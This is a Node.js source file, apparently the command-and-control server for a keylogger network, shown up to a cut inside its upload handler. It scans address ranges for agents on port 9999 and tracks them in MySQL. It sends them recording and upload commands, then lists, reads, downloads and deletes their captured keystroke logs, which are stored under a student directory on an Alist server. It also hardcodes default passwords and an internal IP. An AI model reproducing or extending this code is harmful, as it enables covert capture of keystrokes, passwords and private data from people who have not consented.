const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const net = require('net');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');
const mysql = require('mysql2/promise');
const jschardet = require('jschardet');
const iconv = require('iconv-lite');
const pLimit = require('p-limit');
const winston = require('winston');
const open = require('open');
const crypto = require('crypto');
require('dotenv').config();

const AUTH_CONFIG = {
    password: process.env.WEB_PASSWORD || 'adm1n5',
    secret: process.env.WEB_AUTH_SECRET || 'keylogger_secret',
    cookieName: 'keylogger_auth',
    maxAge: 24 * 60 * 60 * 1000
};

function parseCookies(cookieHeader = '') {
    return cookieHeader.split(';').reduce((cookies, cookie) => {
        const [name, ...rest] = cookie.split('=');
        if (!name) return cookies;
        cookies[name.trim()] = rest.join('=').trim();
        return cookies;
    }, {});
}

function createAuthToken() {
    const expires = Date.now() + AUTH_CONFIG.maxAge;
    const payload = `${expires}`;
    const signature = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(payload).digest('hex');
    return `${payload}.${signature}`;
}

function verifyAuthToken(token) {
    if (!token) return false;
    const [expires, signature] = token.split('.');
    if (!expires || !signature) return false;
    const expected = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(expires).digest('hex');
    try {
        if (!crypto.timingSafeEqual(Buffer.from(signature, 'utf8'), Buffer.from(expected, 'utf8'))) {
            return false;
        }
    } catch (e) {
        return false;
    }
    return Date.now() <= Number(expires);
}

// 配置常量
const CONFIG = {
    alist: {
        url: process.env.ALIST_URL || 'http://10.88.202.73:5244',
        basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
        username: process.env.ALIST_USERNAME || 'keylogger_server',
        password: process.env.ALIST_PASSWORD || '114514',
        tokenRefreshMargin: 5 * 60 * 1000,
    },
    db: {
        host: process.env.DB_HOST || 'localhost',
        port: parseInt(process.env.DB_PORT) || 3306,
        user: process.env.DB_USER || 'log_manager',
        password: process.env.DB_PASSWORD || '',
        database: process.env.DB_NAME || 'client_logs',
        charset: 'utf8mb4',
        connectionLimit:100,
        queueLimit: 0,
        enableKeepAlive: true,
        keepAliveInitialDelay: 10000,
        maxRetries: 3,
        retryDelay: 1000,
    },
    tcpPort: parseInt(process.env.TCP_PORT) || 9999,
    httpPort: parseInt(process.env.PORT) || 3232,
    heartbeatInterval: 30000,
    reconnectInterval: 60000,
    reconnectTimeout: 3000,
    maxConcurrentReconnects: 10,
    scanConcurrency: 200,
    scanPorts: [9999],
    scanTimeout: 3000,
    uploadSizeLimit: '10mb',
    logDir: './logs',
};

// 初始化日志系统
if (!fs.existsSync(CONFIG.logDir)) {
    fs.mkdirSync(CONFIG.logDir, { recursive: true });
}

const logger = winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: winston.format.combine(
        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
        winston.format.errors({ stack: true }),
        winston.format.splat(),
        winston.format.json()
    ),
    defaultMeta: { service: 'log-manager' },
    transports: [
        new winston.transports.File({ filename: path.join(CONFIG.logDir, 'error.log'), level: 'error' }),
        new winston.transports.File({ filename: path.join(CONFIG.logDir, 'combined.log') }),
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.printf(({ timestamp, level, message, ...meta }) => {
                    return `${timestamp} [${level}]: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
                })
            )
        })
    ],
});

// 辅助函数：统一异步错误处理
const asyncHandler = (fn) => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
};

// 初始化 Express
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());

function authMiddleware(req, res, next) {
    const allowedPaths = ['/login', '/login.html', '/api/login'];
    if (allowedPaths.includes(req.path)) {
        return next();
    }

    const cookies = parseCookies(req.headers.cookie || '');
    if (verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        return next();
    }

    if (req.path.startsWith('/api/')) {
        return res.status(401).json({ error: '未授权' });
    }
    return res.redirect('/login');
}

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', asyncHandler(async (req, res) => {
    const { password } = req.body;
    if (password === AUTH_CONFIG.password) {
        const token = createAuthToken();
        res.setHeader('Set-Cookie', `${AUTH_CONFIG.cookieName}=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${AUTH_CONFIG.maxAge / 1000}`);
        return res.json({ success: true });
    }
    return res.status(401).json({ success: false, error: '密码错误' });
}));

app.get('/logout', (req, res) => {
    res.setHeader('Set-Cookie', `${AUTH_CONFIG.cookieName}=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0`);
    res.redirect('/login');
});

app.use(authMiddleware);
app.use(express.static('public'));

// Alist 客户端
class AlistClient {
    constructor(config) {
        this.baseUrl = config.url.replace(/\/$/, '');
        this.basePath = config.basePath.replace(/\/$/, '');
        this.username = config.username;
        this.password = config.password;
        this.token = null;
        this.tokenExpire = 0;
        this.tokenRefreshMargin = config.tokenRefreshMargin || 5 * 60 * 1000;
        this.logger = logger.child({ module: 'AlistClient' });
    }

    async _request(method, endpoint, data = null, options = {}, retry = true) {
        await this._ensureToken();
        const url = `${this.baseUrl}${endpoint}`;
        const headers = {
            'Authorization': this.token,
            ...options.headers
        };
        try {
            const response = await axios({
                method,
                url,
                data,
                headers,
                timeout: 30000,
                ...options
            });
            return response.data;
        } catch (error) {
            if (retry && error.response && error.response.status === 401) {
                this.logger.warn('Token 失效，重新登录');
                await this._login();
                headers.Authorization = this.token;
                const retryResponse = await axios({ method, url, data, headers, ...options });
                return retryResponse.data;
            }
            this.logger.error(`Alist 请求失败: ${method} ${endpoint}`, { error: error.message });
            throw error;
        }
    }

    async _login() {
        try {
            const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
                username: this.username,
                password: this.password
            });
            if (response.data.code === 200) {
                this.token = response.data.data.token;
                // Token 有效期按 23 小时减去刷新边距计算
                this.tokenExpire = Date.now() + 23 * 60 * 60 * 1000 - this.tokenRefreshMargin;
                this.logger.info('Alist 登录成功');
            } else {
                throw new Error('Alist 登录失败: ' + response.data.message);
            }
        } catch (error) {
            this.logger.error('Alist 登录异常', { error: error.message });
            throw error;
        }
    }

    async _ensureToken() {
        if (!this.token || Date.now() >= this.tokenExpire) {
            await this._login();
        }
    }

    // 旧版路径处理：简单直接，已验证可靠
    _getFullPath(relativePath) {
        // 如果已经是绝对路径（以 / 开头），直接返回
        return relativePath.startsWith('/') ? relativePath : `/${relativePath}`;
    }

    async ensureDir(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        try {
            await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
        } catch (err) {
            if (err.response && err.response.status === 404) {
                await this._request('POST', '/api/fs/mkdir', { path: fullPath });
                this.logger.info(`创建目录: ${fullPath}`);
            } else {
                throw err;
            }
        }
    }

    async listFiles(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        try {
            const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
            if (result.code === 200) {
                let items = [];
                if (result.data?.content && Array.isArray(result.data.content)) {
                    items = result.data.content;
                } else if (result.data?.files && Array.isArray(result.data.files)) {
                    items = result.data.files;
                } else if (Array.isArray(result.data)) {
                    items = result.data;
                }
                return items.map(item => ({
                    filename: item.name || item.filename || 'unknown',
                    size: item.size || 0,
                    uploadTime: new Date(item.modified || item.updated || item.mtime || Date.now())
                }));
            }
            return [];
        } catch (err) {
            if (err.response && err.response.status === 404) {
                return [];
            }
            throw err;
        }
    }

    async readFile(filePath) {
        const fullPath = this._getFullPath(filePath);
        const result = await this._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);

        if (result.code === 200 && result.data) {
            let buffer;
            if (result.data.raw_url) {
                const response = await axios.get(result.data.raw_url, {
                    responseType: 'arraybuffer',
                    headers: { 'Authorization': this.token }
                });
                buffer = Buffer.from(response.data);
            } else if (result.data.content) {
                buffer = Buffer.from(result.data.content, 'base64');
            } else {
                throw new Error('无法获取文件内容');
            }

            const detected = jschardet.detect(buffer);
            const encoding = detected.encoding || 'utf-8';
            this.logger.debug(`文件编码检测: ${filePath} -> ${encoding} (置信度: ${detected.confidence})`);
            return iconv.decode(buffer, encoding);
        }
        throw new Error('文件内容获取失败或文件不存在');
    }

    async downloadFile(filePath, res) {
        const fullPath = this._getFullPath(filePath);
        await this._ensureToken();
        const url = `${this.baseUrl}/api/fs/get?path=${encodeURIComponent(fullPath)}`;
        const response = await axios({
            method: 'GET',
            url,
            headers: { 'Authorization': this.token },
            responseType: 'stream'
        });

        if (response.headers['content-type']) {
            res.setHeader('Content-Type', response.headers['content-type']);
        }
        if (response.headers['content-disposition']) {
            res.setHeader('Content-Disposition', response.headers['content-disposition']);
        }

        response.data.on('error', (err) => {
            res.destroy(err);
        });
        response.data.pipe(res);
    }

    async uploadFile(dirPath, filename, content) {
        const fullDir = this._getFullPath(dirPath);
        const fullPath = `${fullDir}/${filename}`;
        await this.ensureDir(dirPath);
        await this._request('PUT', `/api/fs/put?path=${encodeURIComponent(fullPath)}`, content, {
            headers: {
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(content)
            }
        });
        this.logger.info(`文件上传成功: ${fullPath}`);
        return { success: true, filename };
    }

    async deleteFile(filePath) {
    const fullPath = this._getFullPath(filePath);
    const lastSlash = fullPath.lastIndexOf('/');
    const dir = lastSlash > 0 ? fullPath.substring(0, lastSlash) : '/';
    const filename = fullPath.substring(lastSlash + 1);

    await this._request('POST', '/api/fs/remove', {
        dir: dir,
        names: [filename]
    });

    this.logger.info(`文件已删除: ${fullPath}`);
    return { success: true };
}

}

const alistClient = new AlistClient(CONFIG.alist);

// MySQL 数据库
const dbPoolConfig = {
    host: CONFIG.db.host,
    port: CONFIG.db.port,
    user: CONFIG.db.user,
    password: CONFIG.db.password,
    database: CONFIG.db.database,
    charset: CONFIG.db.charset,
    connectionLimit: CONFIG.db.connectionLimit,
    queueLimit: CONFIG.db.queueLimit,
    enableKeepAlive: CONFIG.db.enableKeepAlive,
    keepAliveInitialDelay: CONFIG.db.keepAliveInitialDelay,
};

const pool = mysql.createPool(dbPoolConfig);

async function executeWithRetry(sql, params, retries = CONFIG.db.maxRetries) {
    let lastError;
    for (let i = 0; i < retries; i++) {
        let connection;
        try {
            connection = await pool.getConnection();
            const [result] = await connection.execute(sql, params);
            return result;
        } catch (error) {
            lastError = error;
            logger.warn(`数据库查询失败 (尝试 ${i + 1}/${retries}): ${error.message}`);
            if (error.code === 'PROTOCOL_CONNECTION_LOST' || error.code === 'ECONNREFUSED' || error.fatal) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.db.retryDelay));
                continue;
            }
            throw error;
        } finally {
            if (connection) connection.release();
        }
    }
    throw lastError;
}

async function initDatabase() {
    try {
        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS known_clients (
                id VARCHAR(45) PRIMARY KEY COMMENT '客户端标识 ip:port',
                ip VARCHAR(45) NOT NULL,
                port INT NOT NULL,
                last_seen BIGINT COMMENT '最后在线时间戳（毫秒）',
                created_at BIGINT COMMENT '创建时间戳（毫秒）'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        `);
        logger.info('MySQL 数据库表初始化完成');
    } catch (error) {
        logger.error('数据库初始化失败，退出进程', { error: error.message });
        process.exit(1);
    }
}

async function loadKnownClientsFromDB() {
    try {
        const rows = await executeWithRetry('SELECT id, ip, port, last_seen FROM known_clients');
        const clientsMap = new Map();
        rows.forEach(row => {
            clientsMap.set(row.id, {
                ip: row.ip,
                port: row.port,
                lastSeen: row.last_seen ? new Date(row.last_seen) : null
            });
        });
        logger.info(`从数据库加载了 ${clientsMap.size} 个已知客户端`);
        return clientsMap;
    } catch (error) {
        logger.error('加载已知客户端失败', { error: error.message });
        return new Map();
    }
}

async function saveKnownClientToDB(clientId, ip, port) {
    const now = Date.now();
    await executeWithRetry(
        `INSERT INTO known_clients (id, ip, port, last_seen, created_at) 
         VALUES (?, ?, ?, ?, ?) 
         ON DUPLICATE KEY UPDATE 
             ip = VALUES(ip), 
             port = VALUES(port), 
             last_seen = VALUES(last_seen)`,
        [clientId, ip, port, now, now]
    );
}

async function updateLastSeen(clientId) {
    const now = Date.now();
    await executeWithRetry(
        'UPDATE known_clients SET last_seen = ? WHERE id = ?',
        [now, clientId]
    );
}

async function deleteKnownClientFromDB(clientId) {
    await executeWithRetry('DELETE FROM known_clients WHERE id = ?', [clientId]);
    logger.info(`数据库记录已删除: ${clientId}`);
}

// ClientManager
class ClientManager {
    constructor() {
        this.clients = new Map();
        this.knownClients = new Map();
        this.webClients = new Set();
        this.tcpServer = null;
        this.heartbeatTimer = null;
        this.reconnectTimer = null;
        this.reconnectQueue = new Set();
        this.reconnectLimit = pLimit(CONFIG.maxConcurrentReconnects);
        this.logger = logger.child({ module: 'ClientManager' });
    }

    async init() {
        await initDatabase();
        this.knownClients = await loadKnownClientsFromDB();

        this.startTcpServer();
        this.startHeartbeat();
        await this.connectAllKnownClients();
        this.startReconnectTimer();
    }

    startTcpServer() {
        this.tcpServer = net.createServer((socket) => {
            const remoteAddress = socket.remoteAddress.replace(/^::ffff:/, '');
            const remotePort = socket.remotePort;
            const clientId = `${remoteAddress}:${remotePort}`;

            this.logger.info(`客户端主动连接: ${clientId}`);

            const client = {
                id: clientId,
                ip: remoteAddress,
                port: remotePort,
                socket,
                status: 'online',
                recording: true,
                uploadEnabled: false,
                lastSeen: new Date(),
                logDir: alistClient.basePath,
                shouldReconnect: false
            };

            const existing = this.clients.get(clientId);
            if (existing) {
                existing.socket.destroy();
                this.clients.delete(clientId);
            }

            this.clients.set(clientId, client);
            this.knownClients.set(clientId, {
                ip: remoteAddress,
                port: remotePort,
                lastSeen: new Date()
            });
            saveKnownClientToDB(clientId, remoteAddress, remotePort).catch(e => this.logger.error(e));

            this.setupSocketListeners(client);
            this.broadcastClientUpdate(client, 'connected');
        });

        this.tcpServer.on('error', (err) => {
            this.logger.error('TCP 服务器错误', { error: err.message });
        });

        this.tcpServer.listen(CONFIG.tcpPort, () => {
            this.logger.info(`TCP 被动监听端口 ${CONFIG.tcpPort}`);
        });
    }

    setupSocketListeners(client) {
        const currentSocket = client.socket;

        currentSocket.on('data', (data) => {
            try {
                const messages = data.toString().split('\n').filter(m => m.trim());
                messages.forEach(msg => {
                    try {
                        const response = JSON.parse(msg);
                        this.handleResponse(client, response);
                    } catch (e) {
                        this.logger.error(`解析客户端消息失败: ${msg}`);
                    }
                });
            } catch (e) {
                this.logger.error('处理客户端数据失败', { error: e.message });
            }
        });

        currentSocket.on('close', () => {
            if (client.socket === currentSocket) {
                this.logger.info(`客户端 ${client.id} 连接断开`);
                this.markClientOffline(client);
            }
        });

        currentSocket.on('error', (err) => {
            if (client.socket === currentSocket) {
                this.logger.error(`客户端 ${client.id} 错误: ${err.message}`);
                this.markClientOffline(client);
                // 立即尝试重连（使用 reconnectLimit 控制并发）
                this.reconnectSingleClient(client.id).catch(e =>
                    this.logger.debug(`客户端 ${client.id} 立即重连失败: ${e.message}`)
                );
            }
        });
    }

    markClientOffline(client) {
        client.status = 'offline';
        const now = new Date();
        client.lastSeen = now;
        if (this.knownClients.has(client.id)) {
            this.knownClients.get(client.id).lastSeen = now;
        }
        updateLastSeen(client.id).catch(e => this.logger.error(e));
        this.broadcastClientUpdate(client, 'offline');
    }

    handleResponse(client, response) {
        client.lastSeen = new Date();
        updateLastSeen(client.id).catch(e => this.logger.error(e));

        if (response.status === 'ok' && response.data) {
            if (response.data.recording !== undefined) {
                client.recording = response.data.recording;
            }
            if (response.data.upload_enabled !== undefined) {
                client.uploadEnabled = response.data.upload_enabled;
            }
        }

        this.broadcastToWeb({
            type: 'client_response',
            clientId: client.id,
            response
        });
    }

    sendCommand(clientId, command) {
        const client = this.clients.get(clientId);
        if (!client || client.status === 'offline') {
            return { success: false, error: '客户端离线或不存在' };
        }

        return new Promise((resolve) => {
            const commandStr = JSON.stringify(command) + '\n';
            client.socket.write(commandStr, (err) => {
                if (err) {
                    resolve({ success: false, error: err.message });
                } else {
                    resolve({ success: true });
                }
            });
        });
    }

    async broadcastCommand(command) {
        const tasks = [];
        for (const [clientId, client] of this.clients) {
            if (client.status === 'online') {
                tasks.push(
                    this.sendCommand(clientId, command).then(result => ({ clientId, ...result }))
                );
            }
        }
        return Promise.all(tasks);
    }

    startHeartbeat() {
        this.heartbeatTimer = setInterval(() => {
            this.clients.forEach(async (client, clientId) => {
                if (client.status === 'online') {
                    try {
                        const result = await this.sendCommand(clientId, { action: 'ping' });
                        if (!result.success) {
                            this.logger.warn(`心跳失败: ${clientId}`);
                            this.markClientOffline(client);
                            this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                        }
                    } catch (e) {
                        this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
                        this.markClientOffline(client);
                        this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                    }
                }
            });
        }, CONFIG.heartbeatInterval);
    }

    async connectAllKnownClients() {
        this.logger.info('开始逐个连接已知客户端...');
        const connectTasks = [];
        for (const [clientId, info] of this.knownClients.entries()) {
            const existingClient = this.clients.get(clientId);
            if (existingClient && existingClient.status === 'online') {
                continue;
            }
            connectTasks.push(this.reconnectLimit(() => this.reconnectSingleClient(clientId)));
        }
        await Promise.allSettled(connectTasks);
        this.logger.info('已知客户端连接尝试完成');
    }

    startReconnectTimer() {
        this.reconnectTimer = setInterval(() => {
            this.reconnectOfflineClients();
        }, CONFIG.reconnectInterval);
    }

    async reconnectOfflineClients() {
        this.logger.info('定时检查离线客户端...');
        const offlineList = [];
        for (const [clientId, info] of this.knownClients.entries()) {
            const client = this.clients.get(clientId);
            if (!client || client.status === 'offline') {
                offlineList.push(clientId);
            }
        }
        const tasks = offlineList.map(clientId => this.reconnectLimit(() => this.reconnectSingleClient(clientId)));
        await Promise.allSettled(tasks);
    }

    async reconnectSingleClient(clientId) {
        if (this.reconnectQueue.has(clientId)) {
            return;
        }
        this.reconnectQueue.add(clientId);
        try {
            const info = this.knownClients.get(clientId);
            if (!info) {
                this.logger.warn(`尝试重连未知客户端: ${clientId}`);
                return;
            }
            this.logger.info(`尝试重连: ${clientId}`);
            const clientInfo = await this.tryConnect(info.ip, info.port);
            if (clientInfo) {
                this.logger.info(`重连成功: ${clientId}`);
            } else {
                this.logger.debug(`重连失败: ${clientId}`);
            }
        } catch (e) {
            this.logger.error(`重连异常: ${clientId}`, { error: e.message });
        } finally {
            this.reconnectQueue.delete(clientId);
        }
    }

    async deleteKnownClient(clientId) {
        const client = this.clients.get(clientId);
        if (client) {
            client.socket.destroy();
            this.clients.delete(clientId);
        }
        this.knownClients.delete(clientId);
        await deleteKnownClientFromDB(clientId);
        this.broadcastToWeb({
            type: 'client_deleted',
            clientId: clientId
        });
        this.logger.info(`客户端 ${clientId} 已被完全删除`);
    }

    getClientInfo(client) {
        return {
            id: client.id,
            ip: client.ip,
            port: client.port,
            status: client.status,
            recording: client.recording,
            uploadEnabled: client.uploadEnabled,
            lastSeen: client.lastSeen
        };
    }

    getAllClients() {
        const allClients = [];
        for (const client of this.clients.values()) {
            allClients.push(this.getClientInfo(client));
        }
        for (const [clientId, info] of this.knownClients.entries()) {
            if (!this.clients.has(clientId)) {
                allClients.push({
                    id: clientId,
                    ip: info.ip,
                    port: info.port,
                    status: 'offline',
                    recording: false,
                    uploadEnabled: false,
                    lastSeen: info.lastSeen
                });
            }
        }
        return allClients;
    }

    addWebClient(ws) {
        this.webClients.add(ws);
        ws.send(JSON.stringify({
            type: 'clients_list',
            clients: this.getAllClients()
        }));
    }

    removeWebClient(ws) {
        this.webClients.delete(ws);
    }

    broadcastClientUpdate(client, eventType) {
        const updateMsg = JSON.stringify({
            type: 'client_updated',
            event: eventType,
            client: this.getClientInfo(client)
        });
        const listMsg = JSON.stringify({
            type: 'clients_list',
            clients: this.getAllClients()
        });
        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(updateMsg);
                ws.send(listMsg);
            }
        });
    }

    broadcastToWeb(data) {
        const message = JSON.stringify(data);
        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(message);
            }
        });
    }

    async scanNetwork(startIp, endIp, ports = CONFIG.scanPorts) {
        const startParts = startIp.split('.').map(Number);
        const endParts = endIp.split('.').map(Number);
        if (startParts.length !== 4 || endParts.length !== 4) {
            throw new Error('IP 地址格式错误');
        }

        const ipStringToNumber = (ip) => {
            const parts = ip.split('.').map(Number);
            if (parts.length !== 4 || parts.some(part => Number.isNaN(part) || part < 0 || part > 255)) {
                throw new Error('IP 地址格式错误');
            }
            return parts.reduce((acc, part) => acc * 256n + BigInt(part), 0n);
        };
        const ipNumberToString = (num) => {
            return [
                Number((num >> 24n) & 0xFFn),
                Number((num >> 16n) & 0xFFn),
                Number((num >> 8n) & 0xFFn),
                Number(num & 0xFFn)
            ].join('.');
        };

        const startInt = ipStringToNumber(startIp);
        const endInt = ipStringToNumber(endIp);
        const total = Number(endInt - startInt + 1n);
        if (total <= 0) {
            throw new Error('IP 范围无效');
        }
        if (total > 65536) {
            throw new Error('扫描范围过大，最多允许 65536 个 IP');
        }

        this.logger.info(`开始扫描网络: ${startIp} - ${endIp}, 端口: ${ports.join(',')}`);

        const foundClients = [];
        const limit = pLimit(CONFIG.scanConcurrency);

        const tasks = [];
        for (let i = 0; i < total; i++) {
            const ip = ipNumberToString(startInt + BigInt(i));
            tasks.push(limit(() => this.scanIp(ip, ports).then(client => {
                if (client) foundClients.push(client);
            })));
        }
        await Promise.allSettled(tasks);

        this.logger.info(`扫描完成，发现 ${foundClients.length} 个客户端`);
        return foundClients;
    }

    async scanIp(ip, ports) {
        for (const port of ports) {
            const client = await this.tryConnect(ip, port);
            if (client) return client;
        }
        return null;
    }

    tryConnect(ip, port) {
        return new Promise((resolve) => {
            const cleanIp = ip.split('/')[0];
            const socket = new net.Socket();
            let resolved = false;

            const cleanup = (result) => {
                if (!resolved) {
                    resolved = true;
                    socket.destroy();
                    resolve(result);
                }
            };

            socket.setTimeout(CONFIG.reconnectTimeout);
            socket.connect(port, cleanIp, () => {
                socket.write(JSON.stringify({ action: 'ping' }) + '\n', (err) => {
                    if (err) {
                        cleanup(null);
                        return;
                    }
                    const responseTimeout = setTimeout(() => cleanup(null), 2000);

                    socket.once('data', (data) => {
                        clearTimeout(responseTimeout);
                        try {
                            const msg = JSON.parse(data.toString().split('\n')[0]);
                            if (msg.status === 'ok' || msg.action === 'pong') {
                                const clientId = `${cleanIp}:${port}`;
                                let client = this.clients.get(clientId);
                                const now = new Date();
                                if (!client) {
                                    client = {
                                        id: clientId,
                                        ip: cleanIp,
                                        port,
                                        socket,
                                        status: 'online',
                                        recording: true,
                                        uploadEnabled: false,
                                        lastSeen: now,
                                        logDir: alistClient.basePath,
                                        shouldReconnect: false
                                    };
                                    this.clients.set(clientId, client);
                                    this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
                                    saveKnownClientToDB(clientId, cleanIp, port).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'connected');
                                } else {
                                    const oldSocket = client.socket;
                                    oldSocket.removeAllListeners();
                                    oldSocket.destroy();

                                    client.socket = socket;
                                    client.status = 'online';
                                    client.lastSeen = now;
                                    if (this.knownClients.has(clientId)) {
                                        this.knownClients.get(clientId).lastSeen = now;
                                    }
                                    updateLastSeen(clientId).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'updated');
                                }
                                resolved = true;
                                resolve(this.getClientInfo(client));
                            } else {
                                cleanup(null);
                            }
                        } catch (e) {
                            cleanup(null);
                        }
                    });
                });
            });

            socket.on('error', () => cleanup(null));
            socket.on('timeout', () => cleanup(null));
            socket.on('close', () => {
                if (!resolved) {
                    cleanup(null);
                }
            });
        });
    }

    manualConnect(ip, port) {
        // 直接调用 tryConnect，不经过 reconnectSingleClient 的去重逻辑
        return this.tryConnect(ip, port);
    }
}

const clientManager = new ClientManager();

// 辅助函数：根据 clientId 获取客户端信息
function getClientInfoById(clientId) {
    let client = clientManager.clients.get(clientId);
    if (client) {
        return {
            exists: true,
            isOnline: true,
            ip: client.ip,
            logDir: client.logDir
        };
    }
    const known = clientManager.knownClients.get(clientId);
    if (known) {
        return {
            exists: true,
            isOnline: false,
            ip: known.ip,
            logDir: alistClient.basePath
        };
    }
    return { exists: false };
}

// WebSocket 处理
wss.on('connection', (ws, req) => {
    const cookies = parseCookies(req.headers.cookie || '');
    if (!verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        logger.warn('拒绝未授权的 WebSocket 连接');
        ws.close(1008, 'Unauthorized');
        return;
    }

    logger.info('Web 客户端已连接');
    clientManager.addWebClient(ws);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            switch (data.type) {
                case 'command':
                    const result = await clientManager.sendCommand(data.clientId, data.command);
                    ws.send(JSON.stringify({ type: 'command_result', result }));
                    break;

                case 'broadcast_command':
                    const results = await clientManager.broadcastCommand(data.command);
                    ws.send(JSON.stringify({ type: 'broadcast_result', results }));
                    break;

                case 'scan_network':
                    try {
                        const found = await clientManager.scanNetwork(
                            data.startIp,
                            data.endIp,
                            data.ports || CONFIG.scanPorts
                        );
                        ws.send(JSON.stringify({ type: 'scan_complete', found }));
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'scan_error', message: e.message }));
                    }
                    break;

                case 'manual_connect':
                    try {
                        const client = await clientManager.manualConnect(data.ip, data.port);
                        if (client) {
                            ws.send(JSON.stringify({ type: 'connect_result', client }));
                        } else {
                            ws.send(JSON.stringify({ 
                                type: 'connect_error', 
                                message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问` 
                            }));
                        }
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'connect_error', message: e.message }));
                    }
                    break;

                case 'disconnect_client':
                    const client = clientManager.clients.get(data.clientId);
                    if (client) {
                        client.socket.end();
                        clientManager.clients.delete(data.clientId);
                    }
                    ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
                    break;

                case 'delete_client':
                    try {
                        await clientManager.deleteKnownClient(data.clientId);
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: true,
                            clientId: data.clientId
                        }));
                    } catch (e) {
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: false,
                            clientId: data.clientId,
                            error: e.message
                        }));
                    }
                    break;

                default:
                    ws.send(JSON.stringify({ type: 'error', message: '未知的命令类型' }));
            }
        } catch (e) {
            ws.send(JSON.stringify({ type: 'error', message: e.message }));
        }
    });

    ws.on('close', () => {
        logger.info('Web 客户端已断开');
        clientManager.removeWebClient(ws);
    });
});

// HTTP API
app.get('/api/clients', (req, res) => {
    res.json(clientManager.getAllClients());
});

app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const allFiles = await alistClient.listFiles(clientInfo.logDir);
    const clientFiles = allFiles.filter(file => file.filename.startsWith(clientInfo.ip + '_'));
    res.json(clientFiles);
}));

app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    const filePath = `${clientInfo.logDir}/${filename}`;
    const content = await alistClient.readFile(filePath);
    res.json({ content });
}));

app.get('/api/clients/:clientId/logs/:filename/download', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    const filePath = `${clientInfo.logDir}/${filename}`;
    await alistClient.downloadFile(filePath, res);
}));

app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).send('客户端不存在');
    }
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).send('非法文件名');
    }
    const filePath = `${clientInfo.logDir}/${filename}`;
    const content = await alistClient.readFile(filePath);
    res.type('text/plain').send(content);
}));

app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    const filePath = `${clientInfo.logDir}/${filename}`;
    
    await alistClient.deleteFile(filePath);
    logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId });
    
    res.json({ success: true, message: '文件已删除' });
}));

app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
    const ip = req.params.ip;
    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
    if (!clientId) {
        clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
    }
    if (!clientId) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const client = clientManager.clients.get(clientId);
    const logDir = client ? client.logDir : alistClient.basePath;
    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
